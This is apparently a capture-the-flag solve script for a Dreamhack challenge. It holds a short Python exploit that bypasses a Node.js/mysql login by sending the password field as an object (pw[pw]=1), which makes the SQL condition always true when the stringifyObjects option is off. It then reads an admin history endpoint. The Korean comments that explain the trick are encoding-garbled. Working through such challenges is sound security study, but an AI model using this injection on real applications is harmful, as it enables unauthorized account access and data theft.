#!/usr/bin/env python3

import requests

URL = 'http://host3.dreamhack.games:22836'

auth_data = {'id': 'admin_inject', 'pw[pw]': 1}
# ìœ„ ë°©ë²•ì´ í—·ê°ˆë¦´ ìˆ˜ ìˆë‹¤. ê°‘ìê¸° ë°°ì—´ì„ ë„˜ê¸´ë‹¤ê³ ?? í•˜ë©´ì„œ gptë„ ê·¸ë ‡ê²Œ ë§í–ˆë‹¤;;;
# ê·¼ë° ì‚¬ì‹¤ ì €ê±´ ì´ê±°ë‹¤. pw[pw]=1 ë‹¤ì‹œ ë§í•´ Objectë¼ëŠ” ê²ƒì´ë‹¤.
# pw: {
# 	  pw: 1,
# 	}
# ê·¸ë˜ì„œ ë§Œì•½ì— stringifyObjects ì˜µì…˜ì´ êº¼ì ¸ìˆë‹¤ë©´... ìœ„ ë°©ë²•ìœ¼ë¡œ sql injectionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.
# ì°¸ê³ ë¡œ ê·¸ëƒ¥ ì´ë ‡ê²Œ express.urlencoded()ë§Œ ë„£ìœ¼ë©´ stringifyObjects ì˜µì…˜ì´ êº¼ì ¸ìˆê¸° ë•Œë¬¸ì— sql injectionì— ë§ì´ ì·¨ì•½í•˜ë‹¤.
# ëˆ„ê°€ ê³¼ì—° mysqlë¡œ dbë¥¼ ì„¤ì •í•˜ê³  node jsì—ì„œ ì € ì˜µì…˜ì„ ëŒê¹Œ ìƒê°í–ˆëŠ”ë° ë‚´ê°€ ì˜ˆì „ì— ì˜¬ë ¸ë˜ í”„ë¡œì íŠ¸ê°€ ë°”ë¡œ ê·¸ê±°ì˜€ë‹¤...ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹
# good luck...ğŸ¤£
# ë¡œê·¸ì¸ ì‹œ pwì˜ ê°’ì„ {'pw': 1}ë¡œ ì „ë‹¬í•˜ë©´ pw = ? => pw = `pw` = 1ë¡œ ì¹˜í™˜ë˜ëŠ”ë°, ì´ëŠ” (pw = pw) = 1ê³¼ ë™ì¼í•˜ì—¬ ì–¸ì œë‚˜ ì°¸ì¸ ì¡°ê±´ë¬¸ì´ ë©ë‹ˆë‹¤.

r = requests.Session()
r.post(URL+'/auth', data=auth_data)
print(r.get(URL+'/api/history/1').text)